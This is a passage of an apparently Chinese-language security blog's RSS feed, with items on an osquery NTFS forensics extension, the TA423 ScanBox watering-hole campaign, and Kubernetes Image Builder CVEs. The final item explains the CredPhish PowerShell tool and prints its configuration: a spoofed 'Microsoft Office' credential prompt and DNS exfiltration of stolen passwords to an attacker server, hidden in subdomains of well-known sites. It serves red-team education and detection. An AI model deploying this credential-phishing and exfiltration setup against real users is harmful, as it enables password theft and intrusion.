&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Get-MSUpdate&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Product&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Windows 10&amp;#34;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Severity&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Critical&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>使用osquery收集NTFS取证信息 - 深入解析NTFS取证扩展</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8osquery%E6%94%B6%E9%9B%86ntfs%E5%8F%96%E8%AF%81%E4%BF%A1%E6%81%AF-%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90ntfs%E5%8F%96%E8%AF%81%E6%89%A9%E5%B1%95/</link>
        <pubDate>Sun, 03 Aug 2025 18:57:24 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8osquery%E6%94%B6%E9%9B%86ntfs%E5%8F%96%E8%AF%81%E4%BF%A1%E6%81%AF-%E6%B7%B1%E5%85%A5%E8%A7%A3%E6%9E%90ntfs%E5%8F%96%E8%AF%81%E6%89%A9%E5%B1%95/</guid>
        <description>&lt;h1 id=&#34;使用osquery收集ntfs取证信息&#34;&gt;使用osquery收集NTFS取证信息
&lt;/h1&gt;&lt;p&gt;我们发布了一个osquery扩展，让您能够深入挖掘NTFS文件系统。这不仅是事件响应和数据收集的又一工具，更提供了替代传统取证工具包和商业服务的可能性。&lt;/p&gt;
&lt;h2 id=&#34;现有方案的不足&#34;&gt;现有方案的不足
&lt;/h2&gt;&lt;p&gt;迄今为止，osquery在进行事件响应所需的那种文件系统取证方面一直存在不足。它虽然能收集主机平台上文件的基本信息（时间戳、权限、所有者等），但任何有取证经验的人都知道，文件系统中还蕴藏着更多待挖掘的数据——比如额外的时间戳、未分配的元数据或过时的目录条目。&lt;/p&gt;
&lt;p&gt;传统替代方案往往闭源且昂贵，成为预算、部署路线图和维护计划中的额外负担。更重要的是，它们都无法与osquery集成，迫使您额外花费精力将取证报告映射回设备群。&lt;/p&gt;
&lt;h2 id=&#34;解决方案&#34;&gt;解决方案
&lt;/h2&gt;&lt;p&gt;通过与Crypsis合作，我们已将NTFS取证功能作为扩展集成到osquery接口中。这是朝着更优、更具成本效益且更易部署的解决方案迈出的第一步。&lt;/p&gt;
&lt;h2 id=&#34;功能特性&#34;&gt;功能特性
&lt;/h2&gt;&lt;p&gt;NTFS取证扩展提供NTFS映像中的特定附加文件元数据，包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;文件名时间戳条目&lt;/li&gt;
&lt;li&gt;文件安全描述符&lt;/li&gt;
&lt;li&gt;文件是否包含备用数据流(ADS)&lt;/li&gt;
&lt;li&gt;其他信息&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;同时还能提供目录索引的索引条目（包括已解除分配的条目）。您可以直接在osquery中发现以下痕迹：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自我清理后的恶意软件&lt;/li&gt;
&lt;li&gt;修改了文件时间戳但忘记处理文件名时间戳的痕迹&lt;/li&gt;
&lt;li&gt;隐藏在calc.exe ADS中的rootkit&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;使用方法&#34;&gt;使用方法
&lt;/h2&gt;&lt;p&gt;在osquery启动时通过命令行参数加载扩展：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;osqueryi.exe --extension path\to\ntfs_forensics.ext.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;加载后，数据库将新增三个表：&lt;/p&gt;
&lt;h3 id=&#34;ntfs_part_data&#34;&gt;ntfs_part_data
&lt;/h3&gt;&lt;p&gt;提供磁盘映像中分区的信息。如果查询时未指定磁盘映像，它将尝试通过从&lt;code&gt;\\.\PhysicalDrive0&lt;/code&gt;开始向上遍历来检查主机系统的物理驱动器，直到打开失败为止。&lt;/p&gt;
&lt;h3 id=&#34;ntfs_file_data&#34;&gt;ntfs_file_data
&lt;/h3&gt;&lt;p&gt;提供NTFS文件系统中文件条目的信息。查询时必须明确指定WHERE子句中的device和partition列。注意事项：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;指定path或inode列将返回单个文件的信息&lt;/li&gt;
&lt;li&gt;指定directory列将返回该目录下所有文件的信息&lt;/li&gt;
&lt;li&gt;不指定任何条件将执行整个分区的遍历（由于代价高昂，结果会被缓存）&lt;/li&gt;
&lt;li&gt;使用隐藏列from_cache=0可强制获取实时数据（如：&lt;code&gt;select * from ntfs_file_data where device=&amp;quot;\\.\PhysicalDrive0&amp;quot; and partition=2 and from_cache=0;&lt;/code&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;ntfs_indx_data&#34;&gt;ntfs_indx_data
&lt;/h3&gt;&lt;p&gt;提供指定目录的索引条目内容（包括在slack space中发现的条目）。查询时必须指定：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;WHERE子句中的device和partition列&lt;/li&gt;
&lt;li&gt;parent_path或parent_inode条件&lt;/li&gt;
&lt;li&gt;slack space中的条目将在slack列显示非零值&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;开始使用&#34;&gt;开始使用
&lt;/h2&gt;&lt;p&gt;该扩展为Windows终端文件系统取证提供了快速便捷的方案。您可以在我们的代码库中找到此扩展及其他osquery扩展。我们承诺将持续维护和扩展我们的扩展集合。&lt;/p&gt;
&lt;h2 id=&#34;定制服务&#34;&gt;定制服务
&lt;/h2&gt;</description>
        </item>
        <item>
        <title>水坑攻击推送ScanBox键盘记录器 | 中国APT组织TA423的间谍活动</title>
        <link>http://localhost:1313/p/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB%E6%8E%A8%E9%80%81scanbox%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8-%E4%B8%AD%E5%9B%BDapt%E7%BB%84%E7%BB%87ta423%E7%9A%84%E9%97%B4%E8%B0%8D%E6%B4%BB%E5%8A%A8/</link>
        <pubDate>Sun, 03 Aug 2025 18:51:42 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%B0%B4%E5%9D%91%E6%94%BB%E5%87%BB%E6%8E%A8%E9%80%81scanbox%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%99%A8-%E4%B8%AD%E5%9B%BDapt%E7%BB%84%E7%BB%87ta423%E7%9A%84%E9%97%B4%E8%B0%8D%E6%B4%BB%E5%8A%A8/</guid>
        <description>&lt;h3 id=&#34;水坑攻击推送scanbox键盘记录器&#34;&gt;水坑攻击推送ScanBox键盘记录器
&lt;/h3&gt;&lt;p&gt;研究人员发现一起可能由中国APT组织TA423发起的水坑攻击，试图部署基于JavaScript的ScanBox侦察工具。该中国威胁组织加大了对ScanBox侦察框架的分发力度，目标包括澳大利亚国内组织和南中国海的离岸能源公司。&lt;/p&gt;
&lt;h3 id=&#34;攻击活动细节&#34;&gt;攻击活动细节
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;时间范围&lt;/strong&gt;：2022年4月至6月中旬&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击方式&lt;/strong&gt;：钓鱼邮件伪装成&amp;quot;澳大利亚晨报&amp;quot;员工发送，诱导受害者访问伪造新闻网站australianmorningnews[.]com&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;载荷交付&lt;/strong&gt;：网站植入ScanBox框架，页面内容复制自BBC等真实新闻源&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;scanbox技术分析&#34;&gt;ScanBox技术分析
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;无文件攻击&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;纯JavaScript实现，无需在磁盘部署恶意软件&lt;/li&gt;
&lt;li&gt;通过浏览器执行即可实现键盘记录功能&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;浏览器指纹收集&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;获取操作系统、语言、Adobe Flash版本&lt;/li&gt;
&lt;li&gt;检测浏览器扩展/插件（包括WebRTC）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;网络穿透技术&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;集成WebRTC协议实现实时通信&lt;/li&gt;
&lt;li&gt;利用STUN服务器穿透NAT（通过UDP流量映射）&lt;/li&gt;
&lt;li&gt;采用ICE点对点通信绕过防火墙限制&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;攻击者背景&#34;&gt;攻击者背景
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;组织关联&lt;/strong&gt;：美国司法部指控TA423为海南省国家安全厅提供长期支持&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;地缘目标&lt;/strong&gt;：重点关注南中国海地区（马来西亚、新加坡、台湾、澳大利亚）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;历史活动&lt;/strong&gt;：曾入侵航空、国防、生物制药等跨国企业&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;持续威胁&#34;&gt;持续威胁
&lt;/h3&gt;&lt;p&gt;尽管2021年已被美国司法部起诉，研究人员未观察到该组织活动节奏有明显中断，预计将继续实施情报收集任务。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>Kubernetes镜像构建器漏洞分析：CVE-2024-9486与CVE-2024-9594技术详解</title>
        <link>http://localhost:1313/p/kubernetes%E9%95%9C%E5%83%8F%E6%9E%84%E5%BB%BA%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90cve-2024-9486%E4%B8%8Ecve-2024-9594%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3/</link>
        <pubDate>Sun, 03 Aug 2025 18:35:15 +0800</pubDate>
        
        <guid>http://localhost:1313/p/kubernetes%E9%95%9C%E5%83%8F%E6%9E%84%E5%BB%BA%E5%99%A8%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90cve-2024-9486%E4%B8%8Ecve-2024-9594%E6%8A%80%E6%9C%AF%E8%AF%A6%E8%A7%A3/</guid>
        <description>&lt;h3 id=&#34;摘要&#34;&gt;摘要
&lt;/h3&gt;&lt;p&gt;近期披露的两个漏洞（CVE-2024-9486 CVSS 9.8和CVE-2024-9594 CVSS 6.3）影响Kubernetes镜像构建器，攻击者在特定条件下可利用这些漏洞获取Kubernetes节点的root权限。部分镜像构建提供商未在构建完成后禁用默认管理凭证，导致节点部署后可能被入侵。该问题已在Image Builder v0.1.38版本修复，建议用户重建并重新部署受影响镜像。&lt;/p&gt;
&lt;h3 id=&#34;受影响系统及组件&#34;&gt;受影响系统及组件
&lt;/h3&gt;&lt;p&gt;所有v0.1.37及更早版本的Image Builder均受影响，涉及以下提供商：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;最严重场景&lt;/strong&gt;：Proxmox&lt;/li&gt;
&lt;li&gt;其他受影响提供商：Nutanix、OVA、QEMU和raw格式&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;技术细节攻击概述&#34;&gt;技术细节/攻击概述
&lt;/h3&gt;&lt;h4 id=&#34;cve-2024-9486&#34;&gt;CVE-2024-9486
&lt;/h4&gt;&lt;p&gt;该漏洞存在于使用Proxmox提供商的旧版Image Builder中。构建过程中启用的默认凭证未在完成后正确禁用，导致攻击者可通过残留凭证获取节点root权限。v0.1.38版本通过以下方式修复：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;构建期间仅生成随机临时密码&lt;/li&gt;
&lt;li&gt;镜像构建完成后强制禁用builder账户&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;cve-2024-9594&#34;&gt;CVE-2024-9594
&lt;/h4&gt;&lt;p&gt;此漏洞与CVE-2024-9486类似，但影响Nutanix/OVA/QEMU/raw提供商。关键区别在于：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;仅能在镜像部署周期内被利用&lt;/li&gt;
&lt;li&gt;无法在构建完成后维持访问
因此其CVSS评分较低（6.3）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;修复建议&#34;&gt;修复建议
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;临时缓解&lt;/strong&gt;：在受影响虚拟机上禁用builder账户&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;彻底修复&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;使用已修复的Image Builder v0.1.38重建镜像&lt;/li&gt;
&lt;li&gt;重新部署所有受影响虚拟机&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;威胁现状&#34;&gt;威胁现状
&lt;/h3&gt;&lt;p&gt;Kudelski安全团队尚未监测到这些漏洞的主动利用行为，将持续跟踪相关动态。&lt;/p&gt;
&lt;h3 id=&#34;参考链接&#34;&gt;参考链接
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;https://thehackernews.com/2024/10/critical-kubernetes-image-builder.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Hacker News相关报道&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>使用PowerShell进行用户密码钓鱼的技术解析</title>
        <link>http://localhost:1313/p/%E4%BD%BF%E7%94%A8powershell%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%92%93%E9%B1%BC%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sun, 03 Aug 2025 18:13:46 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E4%BD%BF%E7%94%A8powershell%E8%BF%9B%E8%A1%8C%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E9%92%93%E9%B1%BC%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;使用powershell进行用户密码钓鱼的技术解析&#34;&gt;使用PowerShell进行用户密码钓鱼的技术解析
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;tokyoneon&lt;/strong&gt; //&lt;br&gt;
伪造凭证提示是一种有效的权限提升和横向移动技术。在Windows环境中，用户经常会遇到看似随机的密码提示，例如Outlook、VPN和其他各种认证协议。攻击者会滥用Windows和PowerShell内置功能来调用凭证弹窗以获取用户密码。&lt;/p&gt;
&lt;p&gt;根据&lt;strong&gt;MITRE ATT&amp;amp;CK框架&lt;/strong&gt;的定义：&lt;br&gt;
“当需要额外权限的程序执行时，操作系统通常会提示用户输入正确的凭证以授权任务的提升权限。攻击者可能会模仿常见的操作系统组件，通过PowerShell等语言显示看似合法的凭证提示。”&lt;/p&gt;
&lt;h2 id=&#34;什么是credphish&#34;&gt;什么是CredPhish？
&lt;/h2&gt;&lt;p&gt;CredPhish是一个PowerShell脚本，旨在调用凭证提示并窃取密码。它依赖于&lt;strong&gt;CredentialPicker API&lt;/strong&gt;收集用户密码，使用PowerShell的&lt;strong&gt;Resolve-DnsName&lt;/strong&gt;进行DNS外传数据，并利用Windows Defender的&lt;strong&gt;ConfigSecurityPolicy.exe&lt;/strong&gt;执行任意GET请求。&lt;/p&gt;
&lt;p&gt;下图展示了CredPhish的实际操作。请注意，在Windows安全提示中提交凭证后，凭证会立即发送到攻击者的DNS服务器。&lt;/p&gt;
&lt;p&gt;默认情况下，CredPhish会使用PowerShell内置的DNS解析器&lt;strong&gt;Resolve-DnsName&lt;/strong&gt;外传凭证。它会将凭证中的每个字符转换为十六进制值，将转换后的值分成预定义的块，并将这些块放入热门网站的子域名中。以下截图显示了十六进制形式的外传凭证示例。注意“tokyoneon”的十六进制值（746f6b796f6e656f6e）出现在google.com和office.com的子域名中。&lt;/p&gt;
&lt;p&gt;在解析DNS查询之前，DNS服务器会剥离十六进制子域名以避免生成大量错误响应。在下面的Wireshark截图中，请注意“Answers”字段不再包含子域名，并成功解析为Google的一个IP地址。&lt;/p&gt;
&lt;h2 id=&#34;credphishps1配置&#34;&gt;CredPhish.ps1配置
&lt;/h2&gt;&lt;p&gt;CredPhish.ps1设计为一个独立的脚本，不需要&lt;strong&gt;Import-Module&lt;/strong&gt;（这是一种常见的攻击指标）。可配置选项以变量的形式位于PS1脚本的顶部，以避免冗长的命令行参数。&lt;/p&gt;
&lt;p&gt;第一行是最重要的，它定义了外传数据的接收地址（即攻击者的Kali服务器）：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# exfil address  &lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$exfilServer&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;192.168.56.112&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;接下来的几个变量定义了提示框对目标用户的显示方式。&lt;strong&gt;$promptCaption&lt;/strong&gt;定义了请求凭证的“应用程序”（例如“Microsoft Office”），而**$promptMessage**通常指定与请求关联的账户。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# prompt&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$targetUser&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$env:username&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$companyEmail&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;blackhillsinfosec.com&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$promptCaption&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Microsoft Office&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$promptMessage&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Connecting to: &lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$targetUser&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$companyEmail&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$maxTries&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 提示框的最大调用次数&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$delayPrompts&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 提示框之间的延迟（秒）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$validateCredentials&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;$false&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 如果凭证有效，则中断$maxTries并立即外传&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;strong&gt;$maxTries&lt;/strong&gt;变量定义了提示框在目标提交凭证之前显示的次数。默认值为&lt;strong&gt;1&lt;/strong&gt;以避免引起怀疑。&lt;strong&gt;$delayPrompts&lt;/strong&gt;变量定义了每次提示之间的延迟时间（如果**$maxTries&lt;strong&gt;大于1）。&lt;/strong&gt;$validateCredentials&lt;strong&gt;默认禁用，它会尝试通过在高权限上下文中使用&lt;/strong&gt;Start-Process&lt;strong&gt;来本地验证提交的凭证。如果启用且凭证验证通过，则忽略&lt;/strong&gt;$maxTries**，数据会立即发送到攻击者的服务器。&lt;/p&gt;
&lt;h2 id=&#34;数据外传方法&#34;&gt;数据外传方法
&lt;/h2&gt;&lt;p&gt;如前所述，DNS外传是默认的密码传输方法。&lt;strong&gt;$exfilDomains&lt;/strong&gt;列表包含用于DNS查询的各种域名，并随机选择。&lt;strong&gt;$subdomainLength&lt;/strong&gt;变量确定每个子域名的期望长度。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# dns&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c&#34;&gt;# 在Kali中启动DNS服务器：python3 /path/to/credphish/dns_server.py&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$enableDnsExfil&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;$true&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$exfilDomains&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;.microsoft.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.google.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.office.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;.live.com&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 用于DNS外传的域名&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$randomDelay&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;get-random&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-minimum&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-maximum&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# DNS查询之间的随机延迟&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$subdomainLength&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;6&lt;/span&gt; &lt;span class=&#34;c&#34;&gt;# 子域名的最大字符数。必须是2-60之间的偶数，否则查询会中断&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;要拦截通过DNS外传功能发送的凭证，请在Kali中执行&lt;strong&gt;dns_server.py&lt;/strong&gt;脚本。按&lt;strong&gt;Ctrl + c&lt;/strong&gt;终止DNS服务器，它将重建拦截的明文凭证。&lt;/p&gt;
